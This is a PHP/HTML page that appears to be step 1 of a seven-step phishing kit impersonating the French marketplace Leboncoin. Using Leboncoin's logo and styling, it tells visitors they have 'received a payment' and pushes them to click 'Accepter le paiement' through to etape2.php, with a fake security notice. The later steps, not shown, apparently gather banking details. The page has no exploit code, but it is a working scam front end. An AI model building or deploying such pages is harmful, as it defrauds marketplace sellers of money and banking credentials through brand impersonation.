<?php

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
    $_SERVER['HTTPS'] = 'on';
}
// ============================================
// ÉTAPE 1 - ACCUEIL PAIEMENT SÉCURISÉ
// ============================================
session_start();

// Initialisation de la session pour les 7 étapes
$_SESSION['etape_actuelle'] = 1;
$_SESSION['total_etapes'] = 7;

// Données du paiement (à remplacer par votre logique)
$_SESSION['paiement'] = [
    'montant'    => 149.99,
    'devise'     => 'EUR',
    'expediteur' => 'Marie Martin',
    'reference'  => 'TXN-' . strtoupper(bin2hex(random_bytes(4))),
];
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="images/banques/icone.png" sizes="32x32" data-next-head="">
    <link rel="icon" href="images/banques/icone.png" type="image/svg+xml" data-next-head="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leboncoin - Paiement sécurisé</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f3f4f6;
            color: #1f2937;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER / LOGO ===== */
        .header {
            background: #fff;
            padding: 16px 32px;
            border-bottom: 1px solid #e5e7eb;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #f97316;
            text-decoration: none;
            letter-spacing: -1px;
        }

        /* ===== CONTENU PRINCIPAL ===== */
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            max-width: 520px;
            width: 100%;
            overflow: hidden;
        }

        /* ===== HEADER ORANGE DE LA CARTE ===== */
        .card-header {
            background: #f97316;
            color: #fff;
            padding: 24px 28px;
        }

        .card-header .badge {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .card-header .badge svg {
            width: 18px;
            height: 18px;
        }

        .card-header h1 {
            font-size: 22px;
            font-weight: 700;
        }

        /* ===== CORPS DE LA CARTE ===== */
        .card-body {
            padding: 28px;
        }

        .card-body p {
            font-size: 15px;
            line-height: 1.6;
            color: #374151;
            margin-bottom: 24px;
        }

        /* ===== BOÎTE D'ALERTE ===== */
        .alert-box {
            background: #fff7ed;
            border: 1px solid #fed7aa;
            border-radius: 8px;
            padding: 16px 18px;
            display: flex;
            gap: 12px;
            align-items: flex-start;
            margin-bottom: 28px;
        }

        .alert-box svg {
            width: 20px;
            height: 20px;
            color: #f97316;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .alert-box p {
            font-size: 14px;
            color: #9a3412;
            margin: 0;
            line-height: 1.5;
        }

        /* ===== BOUTONS ===== */
        .actions {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn {
            width: 100%;
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .btn-primary {
            background: #f97316;
            color: #fff;
        }

        .btn-primary:hover {
            background: #ea580c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3);
        }

        .btn-secondary {
            background: #fff;
            color: #4b5563;
            border: 1px solid #d1d5db;
        }

        .btn-secondary:hover {
            background: #f9fafb;
            border-color: #9ca3af;
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 24px 20px 32px;
            font-size: 13px;
            color: #6b7280;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #6b7280;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #f97316;
            text-decoration: underline;
        }

        /* ===== BANDEAU COOKIES ===== */
        .cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #fff;
            border-top: 1px solid #e5e7eb;
            padding: 20px 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.08);
            z-index: 1000;
            flex-wrap: wrap;
        }

        .cookie-banner.hidden {
            display: none;
        }

        .cookie-text h4 {
            font-size: 15px;
            font-weight: 700;
            color: #111827;
            margin-bottom: 6px;
        }

        .cookie-text p {
            font-size: 13px;
            color: #6b7280;
            line-height: 1.5;
            max-width: 900px;
        }

        .cookie-buttons {
            display: flex;
            gap: 10px;
            flex-shrink: 0;
        }

        .btn-cookie {
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }

        .btn-cookie-refuse {
            background: #fde047;
            color: #1f2937;
        }

        .btn-cookie-refuse:hover {
            background: #facc15;
        }

        .btn-cookie-accept {
            background: #f97316;
            color: #fff;
        }

        .btn-cookie-accept:hover {
            background: #ea580c;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 640px) {
            .header { padding: 12px 20px; }
            .card-body { padding: 20px; }
            .card-header { padding: 20px; }
            .cookie-banner {
                flex-direction: column;
                align-items: flex-start;
                padding: 16px 20px;
            }
            .cookie-buttons { width: 100%; }
            .btn-cookie { flex: 1; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
        <a href="#" class="logo"><svg width="164" height="30" viewBox="0 0 164 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="text-main dark:text-on-surface pro:text-support"><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M41.1935 25.077C43.7647 25.0728 45.3528 23.0338 45.3528 20.0045C45.3528 16.9725 43.769 14.9392 41.2007 14.9392C38.6323 14.9392 37.0556 16.9653 37.0556 20.0045C37.0556 23.0409 38.6295 25.0728 41.1935 25.077ZM43.1198 10.0236C48.0211 10.0236 51.2529 14.2472 51.3242 19.9332C51.3242 25.712 47.9426 29.9926 42.9842 29.9926C40.4887 30.0482 38.1457 28.7954 36.8059 26.6894H36.7274V29.6216H31.3482V3.88099C31.3482 1.91906 32.6538 0.691957 34.2019 0.691957C35.75 0.691957 37.0556 1.91906 37.0556 3.88099V13.0557H37.1341C38.5174 11.1316 40.7505 10.0008 43.1198 10.0236ZM62.9246 25.077C65.5001 25.077 67.0697 23.0366 67.0697 20.0045C67.0697 16.9725 65.5001 14.9392 62.9246 14.9392C60.3492 14.9392 58.7796 16.9653 58.7796 20.0045C58.7796 23.0438 60.3492 25.077 62.9246 25.077ZM62.9246 10.0236C68.9888 10.0236 72.9127 14.1687 72.9127 20.0117C72.9127 25.8547 68.9959 29.9997 62.9246 29.9997C56.8533 29.9997 52.9366 25.8547 52.9366 20.0117C52.9366 14.1687 56.8533 10.0236 62.9246 10.0236ZM139.155 10.0239C140.724 10.0239 142.03 11.251 142.058 13.213V29.6219H136.301V13.213C136.301 11.251 137.579 10.0239 139.155 10.0239ZM139.155 0C141.086 0 142.65 1.56527 142.65 3.49581C142.65 5.42636 141.086 6.99163 139.155 6.99163H139.153C137.223 6.99091 135.658 5.42564 135.659 3.4951C135.659 1.56455 137.225 0 139.155 0ZM157.162 10.0239C161.158 10.0239 163.304 12.8627 163.304 17.1654V29.6219H157.547V18.7777C157.547 16.245 156.355 15.4032 154.858 15.4032C152.631 15.4032 150.941 17.2795 150.941 21.2747V29.6219H145.183V13.0346C145.183 11.1511 146.417 10.0382 147.873 10.0382C149.329 10.0382 150.555 11.1511 150.555 13.0346V13.748H150.634C152 11.4408 154.481 10.0254 157.162 10.0239ZM123.866 25.077C126.441 25.077 128.018 23.0366 128.018 20.0045C128.018 16.9725 126.435 14.9392 123.866 14.9392C121.298 14.9392 119.721 16.9653 119.721 20.0045C119.721 23.0438 121.298 25.077 123.866 25.077ZM123.866 10.0236C129.938 10.0236 133.854 14.1687 133.854 20.0117C133.854 25.8547 129.938 29.9997 123.866 29.9997C117.795 29.9997 113.878 25.8547 113.878 20.0117C113.878 14.1687 117.802 10.0236 123.866 10.0236ZM105.36 15.0179C102.863 15.0179 101.329 16.8586 101.329 20.012C101.329 23.1653 102.863 25.006 105.36 25.006C106.791 25.0645 108.137 24.3254 108.855 23.0869H108.927L113.115 25.7765C111.659 28.6159 108.619 30 105.166 30C99.1744 30 95.4859 25.8543 95.4859 20.012C95.4859 14.169 99.1744 10.0239 105.166 10.0239C108.619 10.0239 111.688 11.3937 113.115 14.2474L108.927 16.9364H108.855C108.137 15.6978 106.791 14.9594 105.36 15.0179ZM87.1959 10.0239C91.1911 10.0239 93.3379 12.8627 93.3528 17.1654V29.6219H87.5954V18.7777C87.5954 16.245 86.404 15.4032 84.9058 15.4032C82.6799 15.4032 80.9891 17.2795 80.9891 21.2747V29.6219H75.2246V13.0203C75.2246 11.1369 76.4374 10.0382 77.8999 10.0382C79.3625 10.0382 80.5896 11.1511 80.5896 13.0346V13.748H80.668C82.0328 11.4394 84.5141 10.0239 87.1959 10.0239ZM15.6884 18.87C15.7055 19.6013 15.8353 20.3262 16.0736 21.0182L22.4945 16.2589C21.9138 15.1873 20.773 14.5402 19.5552 14.5895C17.7359 14.5895 15.6884 15.9592 15.6884 18.87ZM21.2674 25.2909C23.3485 25.1718 25.2148 23.9689 26.1829 22.124L29.9713 24.8629C28.523 27.8093 25.5694 29.9924 20.5754 29.9924C18.2125 29.9882 15.9309 29.1263 14.1545 27.5668C11.6432 29.2362 9.5029 29.9496 7.36261 29.9496C3.04635 29.9496 0 27.0602 0 22.7226V3.83091C0 1.87611 1.29844 0.649008 2.85373 0.649008C4.40901 0.649008 5.70745 1.87611 5.70745 3.83091V22.2446C5.70745 24.0995 6.52076 25.0983 8.22586 25.0983C9.15332 25.0983 10.1593 24.5632 11.4648 23.8498C10.8413 22.3666 10.526 20.7721 10.5374 19.1626C10.5374 15.0889 13.441 10.0242 19.5409 10.0242C24.8274 10.0242 27.6669 13.0984 28.8512 16.958L18.6705 24.2643C19.3689 24.9328 20.3007 25.3016 21.2674 25.2909Z"></path></svg></a>
    </header>

    <!-- CONTENU PRINCIPAL -->
    <main class="main">
        <div class="card">
            <div class="card-header">
                <div class="badge">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                        <polyline points="9 12 11 14 15 10"></polyline>
                    </svg>
                    PAIEMENT SÉCURISÉ
                </div>
                <h1>Vous avez reçu un paiement</h1>
            </div>

            <div class="card-body">
                <p>
                    Cliquez sur le bouton ci-dessous pour accepter le paiement.
                    Le montant sera ensuite transféré sur votre compte bancaire.
                </p>

                <div class="alert-box">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                        <polyline points="9 12 11 14 15 10"></polyline>
                    </svg>
                    <p>
                        Suite à notre nouvelle politique de sécurité, des vérifications supplémentaires peuvent être nécessaires afin de lutter contre la fraude.
                    </p>
                </div>

                <div class="actions">
                    <a href="etape2.php" class="btn btn-primary">Accepter le paiement</a>
                    <a href="refus.php" class="btn btn-secondary">Refuser le paiement</a>
                </div>
            </div>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Aide</a>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions générales</a>
        </div>
        <div>© 2026 leboncoin</div>
    </footer>

    <!-- BANDEAU COOKIES -->
    <div class="cookie-banner" id="cookieBanner">
        <div class="cookie-text">
            <h4>Gestion des cookies</h4>
            <p>
                Nous utilisons des cookies pour assurer le bon fonctionnement du site et analyser la façon dont vous interagissez avec nos services. En cliquant sur Accepter, vous consentez à l'utilisation de ces outils à des fins d'analyse et d'amélioration.
            </p>
        </div>
        <div class="cookie-buttons">
            <button class="btn-cookie btn-cookie-refuse" onclick="fermerCookies()">Refuser</button>
            <button class="btn-cookie btn-cookie-accept" onclick="fermerCookies()">Accepter</button>
        </div>
    </div>

    <script>
        function fermerCookies() {
            document.getElementById('cookieBanner').classList.add('hidden');
        }
    </script>

</body>
</html>